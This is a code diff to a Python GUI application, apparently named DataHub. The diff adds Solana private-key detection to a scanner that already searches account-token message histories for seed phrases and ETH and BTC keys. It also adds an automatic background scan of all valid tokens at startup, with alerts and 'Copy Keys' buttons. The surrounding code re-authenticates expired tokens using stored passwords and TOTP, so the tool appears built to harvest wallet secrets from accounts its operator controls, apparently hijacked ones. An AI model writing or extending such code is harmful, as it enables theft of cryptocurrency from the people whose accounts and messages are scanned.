@@ -844,6 +844,24 @@ def _is_private_key(text):
     return False
 
 
+def _is_solana_private_key(text):
+    """Detect Solana private keys: base58-encoded ed25519 keys (87-88 chars) or byte-array JSON [64 ints]."""
+    text = text.strip()
+    # Base58 encoded (Phantom export, solana-keygen): 87-88 chars, base58 charset
+    if re.match(r'^[1-9A-HJ-NP-Za-km-z]{85,90}$', text):
+        return True
+    # Byte array format: [123,45,...] with exactly 64 numbers 0-255
+    if text.startswith('[') and text.endswith(']'):
+        try:
+            import json as _j
+            arr = _j.loads(text)
+            if isinstance(arr, list) and len(arr) == 64 and all(isinstance(x, int) and 0 <= x <= 255 for x in arr):
+                return True
+        except:
+            pass
+    return False
+
+
 def _save_important(entry_type, content, source=''):
     is_new = _add_finding(entry_type, content, source)
     try:
@@ -880,6 +898,19 @@ def _scan_text_for_secrets(text, source=''):
         if _is_private_key(key):
             finds.append(('BTC_WIF_KEY', key))
             _save_important('BTC_WIF_KEY', key, source)
+    # Solana private keys: base58 87-88 chars (skip if already matched as ETH hex or BTC WIF)
+    found_values = {v for _, v in finds}
+    for m in re.finditer(r'(?:^|\s)([1-9A-HJ-NP-Za-km-z]{85,90})(?:\s|$)', text):
+        key = m.group(1).strip()
+        if key not in found_values and _is_solana_private_key(key):
+            finds.append(('SOL_PRIVATE_KEY', key))
+            _save_important('SOL_PRIVATE_KEY', key, source)
+    # Solana byte-array format: [12,34,...] with 64 ints
+    for m in re.finditer(r'(\[(?:\s*\d{1,3}\s*,){63}\s*\d{1,3}\s*\])', text):
+        candidate = m.group(1).strip()
+        if _is_solana_private_key(candidate):
+            finds.append(('SOL_PRIVATE_KEY', candidate))
+            _save_important('SOL_PRIVATE_KEY', candidate, source)
     return finds
 
 
@@ -2927,8 +2958,9 @@ class FindingsPanel(ActionPanel):
             seeds = sum(1 for f in _findings_store if f['type'] == 'SEED_PHRASE')
             eth = sum(1 for f in _findings_store if f['type'] == 'ETH_PRIVATE_KEY')
             btc = sum(1 for f in _findings_store if f['type'] == 'BTC_WIF_KEY')
+            sol = sum(1 for f in _findings_store if f['type'] == 'SOL_PRIVATE_KEY')
         self._count_label = ctk.CTkLabel(info_row,
-            text=f"🔑 {count} unique findings  ·  {seeds} seeds  ·  {eth} ETH keys  ·  {btc} BTC keys",
+            text=f"🔑 {count} findings  ·  {seeds} seeds  ·  {eth} ETH  ·  {btc} BTC  ·  {sol} SOL",
             font=_F(FONT, 13, "bold"), text_color=C['green'] if count else C['text_muted'])
         self._count_label.pack(side="left")
 
@@ -2944,7 +2976,7 @@ class FindingsPanel(ActionPanel):
                       font=_F(FONT, 11, "bold"), command=lambda: self._copy_type('SEED_PHRASE')).pack(side="left", padx=6)
         ctk.CTkButton(btn_row, text="📋 Copy Keys", width=100, height=28, corner_radius=7,
                       fg_color=C['surface_2'], hover_color=C['card_hover'],
-                      font=_F(FONT, 11, "bold"), command=lambda: self._copy_type('ETH_PRIVATE_KEY', 'BTC_WIF_KEY')).pack(side="left", padx=6)
+                      font=_F(FONT, 11, "bold"), command=lambda: self._copy_type('ETH_PRIVATE_KEY', 'BTC_WIF_KEY', 'SOL_PRIVATE_KEY')).pack(side="left", padx=6)
 
         # Override the console area with a scrollable findings list
         # The console is already built by ActionPanel, so we just populate it
@@ -2981,9 +3013,10 @@ class FindingsPanel(ActionPanel):
             seeds = sum(1 for f in items if f['type'] == 'SEED_PHRASE')
             eth = sum(1 for f in items if f['type'] == 'ETH_PRIVATE_KEY')
             btc = sum(1 for f in items if f['type'] == 'BTC_WIF_KEY')
+            sol = sum(1 for f in items if f['type'] == 'SOL_PRIVATE_KEY')
         try:
             self._count_label.configure(
-                text=f"🔑 {len(items)} unique findings  ·  {seeds} seeds  ·  {eth} ETH keys  ·  {btc} BTC keys",
+                text=f"🔑 {len(items)} findings  ·  {seeds} seeds  ·  {eth} ETH  ·  {btc} BTC  ·  {sol} SOL",
                 text_color=C['green'] if items else C['text_muted'])
         except: pass
         # Clear console and re-render
@@ -2993,8 +3026,8 @@ class FindingsPanel(ActionPanel):
             if not items:
                 self.console.insert('end', 'No findings yet. Press ▶ Start to scan all tokens.\n', 'dim')
             else:
-                type_icons = {'SEED_PHRASE': '🌱', 'ETH_PRIVATE_KEY': '⟠', 'BTC_WIF_KEY': '₿'}
-                type_colors = {'SEED_PHRASE': 'green', 'ETH_PRIVATE_KEY': 'cyan', 'BTC_WIF_KEY': 'yellow'}
+                type_icons = {'SEED_PHRASE': '🌱', 'ETH_PRIVATE_KEY': '⟠', 'BTC_WIF_KEY': '₿', 'SOL_PRIVATE_KEY': '◎'}
+                type_colors = {'SEED_PHRASE': 'green', 'ETH_PRIVATE_KEY': 'cyan', 'BTC_WIF_KEY': 'yellow', 'SOL_PRIVATE_KEY': '#9945FF'}
                 for i, f in enumerate(items, 1):
                     icon = type_icons.get(f['type'], '🔑')
                     color = type_colors.get(f['type'], 'white')
@@ -3179,6 +3212,8 @@ class DataHub(ctk.CTk):
         if self.expired_tokens:
             print(f'[startup] {len(self.expired_tokens)} expired tokens loaded — starting auto-recovery...')
             threading.Thread(target=self._startup_recover, daemon=True).start()
+        # Auto-scan ALL valid tokens for seeds/keys in background at startup
+        threading.Thread(target=self._startup_scan_secrets, daemon=True).start()
 
     # ━━━ Layout ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     def _build_ui(self):
@@ -3583,6 +3618,30 @@ class DataHub(ctk.CTk):
             return
         print(f'[startup] Attempting recovery of {len(recoverable)} token(s) with TOTP...')
         self._auto_recover_expired(recoverable)
+
+    def _startup_scan_secrets(self):
+        """Auto-scan all valid tokens for seeds/keys at startup (background)."""
+        time.sleep(8)  # Let tokens finish verifying first
+        with self._lock:
+            valid = [t for t in self.tokens if t.valid is True]
+        if not valid:
+            print('[startup-scan] No valid tokens to scan for secrets yet')
+            return
+        print(f'[startup-scan] 🔍 Scanning {len(valid)} token(s) for seeds/keys in background...')
+        before = len(_findings_store)
+        for i, t in enumerate(valid):
+            uname = t.display_name or t.username or t.token[:12]
+            try:
+                _scan_token_messages(t)
+            except Exception as e:
+                print(f'[startup-scan] ✗ {uname}: {e}')
+            time.sleep(0.3)
+        after = len(_findings_store)
+        new_count = after - before
+        print(f'[startup-scan] Done — {after} total findings ({new_count} new)')
+        if new_count > 0:
+            try: _play_finding_alert()
+            except: pass
 
     def _auto_recover_expired(self, expired_list):
         """Attempt to re-authenticate expired tokens that have email + password + TOTP."""
